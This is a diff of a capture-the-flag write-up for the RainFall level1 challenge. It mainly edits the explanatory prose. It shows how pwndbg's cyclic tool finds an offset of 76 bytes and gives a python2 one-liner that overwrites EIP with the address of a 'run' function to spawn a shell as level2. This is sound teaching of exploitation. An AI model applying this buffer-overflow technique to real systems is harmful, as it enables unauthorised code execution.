@@ -81,28 +81,32 @@ LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
 ...SNIP...
 ```
 
+The register we are interested in is the EIP register, which contains the address of the next instruction to be
+executed. We see that the EIP register contains the value 'taaa'. Using the cyclic -l command, we can find the offset in
+the cyclic pattern that corresponds to this value. In this case, the offset is 76 bytes.
+
 ```shell
 pwndbg> cyclic -l taaa
 Finding cyclic pattern of 4 bytes: b'taaa' (hex: 0x74616161)
 Found at offset 76
 ```
 
-
 ## Crafting the Payload
 
-We use python to create a payload that consists of 76 'A's followed by the address of the `run` function in
-little-endian format. We save the result into the file `/tmp/payload`.
+We use Python to create a payload consisting of 76 'A's followed by the address of the `run` function in little-endian
+format, with the intention of overwriting the EIP register and redirecting the program flow to the `run` function.
+We save the result to the file `/tmp/payload`.
 
 ```shell
 ┌──(kali㉿kali)-[~/rainfall/level1]
 └─$ python2 -c 'print "A" * 76 + "\x44\x84\x04\x08"' > /tmp/payload 
 ```
 
-## Executing `run` function:
+## Executing `run` function
 
-We use the `cat` command with the `-` option set to keep STDIN open since the shell that will be executed by the `run`
-function will need an interactive terminal open to interact with. Using the `id` command we verify that we are running
-as `level2`. However, there is not a flag file.
+We use the `cat` command with the `-` option to keep STDIN open, since the shell executed by the `run` function needs an
+interactive terminal to work properly. Once we run our exploit successfully, we can use the `id` command to verify that
+the shell is running as the `level2` user. However, there is no flag file.
 
 ```shell
 level1@RainFall:~$ cat /tmp/payload - | ./level1
